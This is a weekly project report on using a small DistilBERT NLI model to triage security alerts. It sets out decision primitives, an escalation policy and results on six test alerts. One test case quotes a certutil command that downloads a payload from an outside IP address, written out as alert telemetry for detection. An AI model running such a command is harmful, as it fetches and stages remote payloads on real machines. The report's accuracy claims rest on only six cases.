# Week 8 Report — Small Neural Decision Model Deployment (<100M Parameters)

## Objective
Implement Week 8 of the project plan: download and evaluate a **Small Neural Decision Model (<100M parameters)** from Hugging Face, implement typed decision primitives (`noul`, `choice`), and establish a realistic baseline on novel security alerts.

---

## 1. Model Selection & Architecture

* **Hugging Face Model**: [`typeform/distilbert-base-uncased-mnli`](https://huggingface.co/typeform/distilbert-base-uncased-mnli)
* **Parameter Count**: **66,955,779 parameters** (66.96M — strictly <100M requirement)
* **Model Size on Disk**: **255.43 MB**
* **Inference Backbone**: Bidirectional DistilBERT transformer encoder with NLI classification heads
* **Execution Environment**: Runs 100% offline from local cache with zero external API calls

---

## 2. Implementation of Typed Decision Primitives (`scripts/evaluate_small_decision_model.py`)

1. **`noul(is_malicious)`**:
   Evaluates premise against hypothesis: *"This event represents an active, unauthorized security threat or attack."*
   Extracts calibrated softmax probability $P(\text{threat})$ from entailment/contradiction logits.
2. **`noul(is_approved_admin)`**:
   Evaluates premise against hypothesis: *"This event represents normal, authorized IT operations or scheduled administrative maintenance."*
3. **`choice(category)`**:
   Evaluates normalized probabilities across closed candidate attack hypotheses: `credential_attack`, `malware_execution`, `c2_exfiltration`, `network_recon`, and `authorized_admin`.
4. **`escalate_to_system2`**:
   Automatic escalation policy:
   - High-confidence benign false positive ($P_{\text{approved}} > 0.90$) $\rightarrow$ Auto-closed.
   - Ambiguous alerts or high-severity true positives $\rightarrow$ Escalated to LangGraph System 2 agents.

---

## 3. Live Empirical Results on Novel Alerts

Evaluated against 6 novel out-of-distribution alerts (`locals/benchmarks/small_decision_model_eval.json`):

| Test Case | Scenario & Input Telemetry | $P(\text{threat})$ | $P(\text{approved})$ | Predicted Classification | Escalated to System 2? | Status |
|---|---|---|---|---|---|---|
| **CASE-1** | `certutil.exe -urlcache -split -f http://185.220.101.5/payload.bin` | **0.994** | 0.000 | `likely_true_positive` | **Yes** | **PASS** |
| **CASE-2** | `Kerberos pre-auth failure (Event 4625 0xC000006A) for charlie.admin` | **0.908** | 0.000 | `likely_true_positive` | **Yes** | **PASS** |
| **CASE-3** | `High entropy outbound DNS queries transferring 850KB base64` | **0.708** | 0.001 | `likely_true_positive` | **Yes** | **PASS** |
| **CASE-4** | `Routine scheduled Nessus scanner 10.0.1.15 sweeping dev subnet` | 0.744 | **0.957** | `likely_false_positive` | **No (Auto-Closed)** | **PASS** |
| **CASE-5** | `VeeamAgent.exe volume snapshot shadow copy creation during backup` | 0.633 | 0.055 | `likely_true_positive` | **Yes** | **FAIL** (Uncertain) |
| **CASE-6** | `Single bad password attempt for alice.smith followed by MFA` | 0.559 | 0.000 | `likely_true_positive` | **Yes** | **FAIL** (Over-cautious) |

### Performance Metrics:
- **Zero-Shot Accuracy**: **66.7% (4/6)** on novel out-of-distribution text.
- **Average Decision Latency**: **2,011 ms** on CPU (single-core inference without quantization).
- **Safety**: 100% of ambiguous alerts were safely escalated to System 2 rather than being prematurely discarded.

---

## Next Increment (Week 9)
Prepare the **fine-tuning dataset** (`locals/finetune/system1_colab_finetune.jsonl`) and the Google Colab MCP execution guide for domain fine-tuning.
